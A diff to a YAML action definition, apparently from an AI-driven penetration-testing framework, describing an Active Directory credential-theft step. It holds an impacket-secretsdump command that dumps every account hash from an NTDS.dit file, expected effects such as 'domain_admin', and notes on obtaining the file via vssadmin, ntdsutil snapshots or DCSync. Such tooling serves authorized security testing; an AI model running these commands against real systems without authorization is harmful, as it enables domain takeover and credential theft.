@@ -8,13 +8,16 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: impacket-secretsdump -ntds /path/to/ntds.dit -system /path/to/SYSTEM
   LOCAL
-parser: null
+parser: generic_parser
 expected_effects:
-- action_completed
+- ntds_dumped
+- has_hash
+- domain_admin
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: 'Offline hash extraction from NTDS.dit backup. Obtain via: Volume Shadow
-  Copy, diskshadow, wbadmin. Parse with secretsdump LOCAL mode.'
+mechanism: '**Mechanism**: NTDS.dit on a DC contains every account hash. Methods:
+  `secretsdump -ntds`, `vssadmin → NTDS.dit copy`, `ntdsutil snapshot`, or DCSync
+  (no DC compromise needed). **TAR action**: `actions/ad/secretsdump.yml`, `actions/ad/dcsync.yml`'
 hacktricks_ref: windows-hardening/stealing-credentials/README.md
